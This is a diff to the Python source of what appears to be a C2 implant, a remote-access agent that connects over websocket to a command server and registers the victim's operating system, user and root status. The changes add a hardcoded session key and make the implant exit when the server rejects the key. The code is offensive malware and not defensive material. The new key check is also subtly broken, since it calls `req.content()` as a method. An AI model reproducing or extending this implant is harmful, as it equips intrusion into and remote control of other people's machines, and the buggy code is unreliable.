@@ -21,10 +21,11 @@ import requests
 
 
 class Impl:
-    def __init__(self, c2_ws_url: str, group: str = "grupo"):
+    def __init__(self, c2_ws_url: str, group: str = "grupo", sess_key: str = ""):
             self.c2_ws_url = c2_ws_url
             self.group = group
             self.current_dir = os.getcwd()
+            self.sess_key = sess_key
             self.upload_buffer = []
             self.upload_destination = None
             self.running = True
@@ -65,7 +66,7 @@ class Impl:
         try:
             
             async with connect(
-                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
+                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}-root={self._get_root()}-user={self._get_user()}&sess_key={self.sess_key}".lower(),
                 ping_interval=20,
                 ping_timeout=10,
                 close_timeout=10,
@@ -75,6 +76,10 @@ class Impl:
                 self.retry_count = 0  
                 
                 
+                rec = await asyncio.wait_for(ws.recv(), timeout=60)
+
+                if "Invalid conection" in str(rec).strip():
+                    sys.exit(0)
 
                 while self.running:
                     try:
@@ -635,7 +640,8 @@ class Impl:
             'operating_system': self._get_operating_system(),
             'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
             'root': self._get_root(),
-            'user': self._get_user()
+            'user': self._get_user(),
+            'sess_key': self.sess_key
         }
 
 
@@ -646,6 +652,10 @@ class Impl:
                 await asyncio.sleep(3)
             try:
                 req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),  data=model, timeout=10)
+                
+                if "Invalid session key" in req.content():
+                    sys.exit(0)
+                
                 if req.status_code == 200:
                     return True
                 else:
@@ -706,9 +716,10 @@ if __name__ == "__main__":
 
     C2_WS_URL = "localhost:4444"
     GROUP_NAME = "grupo"
+    SESS_KEY = "1234567"
     
     
-    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME, sess_key=SESS_KEY)
 
     
     def signal_handler(sig, frame):
